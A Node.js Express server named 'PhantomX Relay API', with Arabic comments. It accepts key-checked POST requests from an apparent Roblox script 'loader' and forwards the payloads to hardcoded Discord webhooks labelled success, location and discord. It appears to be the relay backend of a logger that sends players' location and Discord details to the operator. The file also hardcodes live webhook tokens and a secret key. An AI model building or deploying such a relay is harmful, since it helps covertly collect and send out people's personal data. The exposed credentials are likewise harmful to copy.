const express = require("express");
const fetch = require("node-fetch");
const cors = require("cors");
const app = express();

app.use(cors());
app.use(express.json());

// الويب هوكات مباشرة في الكود
const WEBHOOKS = {
    success: "https://discord.com/api/webhooks/1449849027205005553/PAEzYHXc3N73MSE4amTvjYzQgzeWyTF_G9j2TbszgjuhhbMfraCj71jxXydDrRpbPEWR",
    location: "https://discord.com/api/webhooks/1470005712418771138/r6ejZJ___runqhgu0_IKmepof1DPdL4-d3VI5wJHO32OVEe4AhJLcB2mvJDU1jrn7jls",
    discord: "https://discord.com/api/webhooks/1449124545620611255/OnOeMG0VM3A4XeS3aBDRs5xxETz_rXnc-i2R__zKwyA06VLuNE6nFdJaP38Po1Q80rkB"
};

const SECRET_KEY = "93847165029471658392016485730291";

// روت أساسي للتأكد من تشغيل السيرفر
app.get("/", (req, res) => {
    res.json({ 
        status: "online",
        service: "PhantomX Relay API",
        webhooks: Object.keys(WEBHOOKS)
    });
});

// روت الاستقبال من اللودر
app.post("/log", async (req, res) => {
    try {
        console.log("=== 📥 NEW REQUEST FROM ROBLOX ===");
        console.log("Time:", new Date().toLocaleString());
        
        // التحقق من المفتاح
        const key = req.headers["x-key"];
        if (key !== SECRET_KEY) {
            console.log("❌ Invalid key received:", key);
            return res.status(401).json({error: "Invalid key"});
        }
        console.log("🔑 Key: Valid");

        // التحقق من البيانات
        const { type, embed } = req.body;
        if (!type) {
            console.log("❌ Missing type");
            return res.status(400).json({error: "Missing type"});
        }
        if (!embed) {
            console.log("❌ Missing embed");
            return res.status(400).json({error: "Missing embed"});
        }

        console.log("📊 Type received:", type);
        console.log("📦 Embed data received");

        // تحويل النوع لوضعه المناسب
        let webhookType = "";
        
        if (type.toLowerCase().includes("success")) webhookType = "success";
        else if (type.toLowerCase().includes("location")) webhookType = "location";
        else if (type.toLowerCase().includes("discord")) webhookType = "discord";
        else webhookType = type.toLowerCase();
        
        console.log("🔄 Converted type to:", webhookType);

        if (!WEBHOOKS[webhookType]) {
            console.log("❌ Invalid webhook type after conversion:", webhookType);
            console.log("Available types:", Object.keys(WEBHOOKS));
            return res.status(400).json({error: "Invalid webhook type: " + webhookType});
        }

        const webhookUrl = WEBHOOKS[webhookType];
        console.log(`📤 Forwarding to ${webhookType} webhook`);
        console.log(`🔗 Webhook URL: ${webhookUrl.substring(0, 60)}...`);

        // إضافة معلومات إضافية لل embed
        const enhancedEmbed = {
            ...embed,
            footer: embed.footer || { text: "PhantomX • " + new Date().toLocaleString() },
            timestamp: embed.timestamp || new Date().toISOString()
        };

        // إرسال للويب هوك المناسب
        const discordPayload = {
            embeds: [enhancedEmbed],
            username: "PhantomX Logger",
            avatar_url: "https://cdn.discordapp.com/attachments/1153844022028087316/1251378827826102393/phantomx_logo.png"
        };

        console.log("🔄 Sending to Discord...");
        
        const response = await fetch(webhookUrl, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(discordPayload)
        });

        const responseText = await response.text();
        console.log(`✅ Discord Response - Status: ${response.status}`);
        console.log(`📨 Response Body: ${responseText.substring(0, 100)}...`);
        
        res.json({ 
            success: true, 
            discordStatus: response.status,
            type: webhookType,
            message: `Webhook sent to ${webhookType}`
        });
        
    } catch (err) {
        console.error("🔥 SERVER ERROR:", err);
        res.status(500).json({ 
            error: "Server error",
            details: err.message 
        });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log("==========================================");
    console.log("🚀 PhantomX Relay API Started");
    console.log(`📍 Port: ${PORT}`);
    console.log(`🔑 Key: ${SECRET_KEY.substring(0, 10)}...`);
    console.log("🌐 Webhooks Configured:");
    console.log("   • success:", WEBHOOKS.success ? "✅" : "❌");
    console.log("   • location:", WEBHOOKS.location ? "✅" : "❌");
    console.log("   • discord:", WEBHOOKS.discord ? "✅" : "❌");
    console.log("==========================================");
});
